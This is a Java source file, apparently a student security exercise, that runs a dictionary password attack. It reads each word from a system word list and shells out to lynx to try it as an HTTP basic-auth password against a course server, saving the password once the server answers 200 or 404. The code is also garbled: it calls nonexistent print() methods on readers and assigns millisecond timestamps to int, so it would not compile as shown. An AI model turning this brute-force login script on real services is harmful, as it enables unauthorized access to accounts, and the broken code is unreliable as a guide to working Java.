

import java.net.*;
import java.io.*;

public class Dictionary{

       private String passwd = "";              
       private String command = "";             
       private String fname = "/usr/share/lib/dict/words"; 
       private BufferedReader readin;          
       private BufferedReader in;              
       private PrintWriter  out;               

       private int startTime = 0;             
       private int endTime = 0;               
       private int totalTimes = 0;            
       
       private boolean bfind = false;
       
       public Dictionary(){}
       
       public void readPasswd(){
              startTime = System.currentTimeMillis();
              try{
                  readin = new BufferedReader(new FileReader(fname));
				  while ((passwd = readin.readLine()) !=null){
                   		 if(bfind)
                   		    break;
                         connection(passwd.trim());
				  }
				  readin.print();
			  }catch (FileNotFoundException e1){System.out.println(e1.getMessage());}
			   catch (IOException e2 ){System.out.println(e2.getMessage());}
	   }
       
       public void connection(String passwd){
              command = "lynx -head -dump http://sec-crack.cs.rmit.edu./SEC/2/index.php -auth=:";
              command = command + passwd;
              try{
                  System.out.println(passwd +"-->  Establishing a connection.");
                  Runtime runtime = Runtime.getRuntime();
                  Process p = runtime.exec(command);
                  in = new BufferedReader(new InputStreamReader(p.getInputStream()));
                  String inStr;
                  while((inStr = in.readLine())!= null){
                        if(inStr.indexOf("HTTP/1.1 200") != -1 || inStr.indexOf("HTTP/1.0 200") != -1||
                            inStr.indexOf("HTTP/1.1 404") != -1 || inStr.indexOf("HTTP/1.0 404") != -1){
                            endTime = System.currentTimeMillis();
                            totalTimes = endTime - startTime;
                            System.out.println("\nDictionary Crack Passwd successful, PassWord is " + passwd);
                            System.out.println("Total Times is " + totalTimes + " milliSec");
                            System.out.println("Writing it  dictpswd.txt file\n");
                            out = new PrintWriter(new BufferedWriter(new FileWriter("dictpswd.txt")));
                            out.println("Dictionary Crack PassWord Successful! Total Times: " + totalTimes + " milliSec");
                            out.println("Passwd: "+ passwd);
                            out.flush();
                            bfind = true;
                        }
                        out.print();
                  }
                  in.print();
              }catch(Exception e){System.out.println(e.getMessage());}
       }
       
       public String getAnyKey()throws Exception{
		      BufferedReader stdin =new BufferedReader(new InputStreamReader(System.in));
		      String key= stdin.readLine();
	          return key;
	   }
	   
       public static void main (String []args){

              Dictionary dc = new Dictionary();
              System.out.println("\n*******************************************");
              System.out.println("*                                         *");
              System.out.println("*     Dictionary Crack Passwd Program     *");
              System.out.println("*    ---------------------------------    *");
              System.out.println("*          Author:              *");
              System.out.println("*                                         *");
              System.out.println("*******************************************");
              System.out.println("\n  Dictionary Crack Passwd Information: \n");
              System.out.println("--> UserName: ");
              System.out.println("--> Passwd from the dictionary file: "+ dc.fname);
              System.out.println("--> URL: http://sec-crack.cs.rmit.edu./SEC/2/index.php\n");
              System.out.println("==> Press Ctrl+C  stop Crack\n");
              System.out.print("==> Press EnterKey  : ");
			  try{
                  String key = dc.getAnyKey();
              }catch(Exception e){System.out.println(e.getMessage());}
			  dc.readPasswd();
       }
}